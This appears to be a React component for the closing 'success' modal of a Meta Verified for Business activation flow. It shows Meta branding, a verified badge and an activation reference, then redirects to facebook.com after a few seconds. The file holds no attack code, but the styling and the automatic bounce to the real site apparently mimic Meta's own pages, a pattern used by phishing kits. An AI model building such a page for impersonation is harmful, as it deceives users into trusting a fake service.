'use client'

import React from 'react';

import { useAppStrings } from '@/hooks/useAppStrings';
import ActivationRefChip from '@/components/meta-verified-for-business/ActivationRefChip';

import Modal from './Modal';

interface SuccessModalProps {
    isOpend: boolean;
    onToggleSuccess: (value: boolean) => void;
}

const FACEBOOK_HOME = 'https://www.facebook.com/'
/** Sau khi hiện màn hoàn thành, tự quay về Facebook. */
const AUTO_RETURN_MS = 4500

const SuccessModal: React.FC<SuccessModalProps> = ({ isOpend, onToggleSuccess }) => {
    const t = useAppStrings();
    const [isOpen, setIsOpen] = React.useState(isOpend);
    const returnedRef = React.useRef(false)

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    const handleReturnToFacebook = React.useCallback(() => {
        if (returnedRef.current) return
        returnedRef.current = true
        setIsOpen(false);
        onToggleSuccess(false);
        window.location.assign(FACEBOOK_HOME);
    }, [onToggleSuccess]);

    React.useEffect(() => {
        if (!isOpend) {
            returnedRef.current = false
            return
        }

        const timer = window.setTimeout(() => {
            handleReturnToFacebook()
        }, AUTO_RETURN_MS)

        return () => window.clearTimeout(timer)
    }, [isOpend, handleReturnToFacebook]);

    return (
        <Modal
            isOpen={isOpen}
            title={t.success.title}
            onClose={handleReturnToFacebook}
            panelClassName="mv-official-modal"
            titleClassName="mv-modal-title"
            backdropClassName="mv-official-backdrop"
        >

            <div className="flex min-h-full w-full min-w-0 flex-col gap-8 pb-2">
                <div className="w-full min-w-0">
                    <div className="mv-success-hero mb-[15px] flex flex-col items-center rounded-[16px] border px-6 py-8">
                        <img
                            src="/images/icons/ic_blue.svg"
                            className="h-[72px] w-[72px] drop-shadow-[0_4px_12px_rgba(0,100,224,0.2)]"
                            alt={t.main.altVerifiedBadge}
                        />
                        <ActivationRefChip centered className="mt-[14px]" />
                    </div>
                    <p className='text-meta-text-secondary mb-[10px] text-[15px] leading-[1.65]'>
                        {t.success.p1}
                    </p>
                    <p className='text-meta-text-muted mb-[20px] text-[14px] leading-[1.6]'>
                        {t.success.p2}
                    </p>
                    <p className='mv-info-callout mb-[20px] rounded-[12px] border p-[12px] text-[13px] leading-[1.55]'>
                        {t.success.idleNote}
                    </p>
                    <button
                        type="button"
                        onClick={handleReturnToFacebook}
                        className='mv-btn-primary min-h-[48px] w-full rounded-[40px] px-4 py-[10px] text-[15px] font-semibold text-white flex items-center justify-center transition-[filter,transform] duration-200 active:scale-[0.995]'
                    >
                        {t.success.cta}
                    </button>
                </div>

                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
                </div>
            </div>
        </Modal>
    );
};

export default SuccessModal;
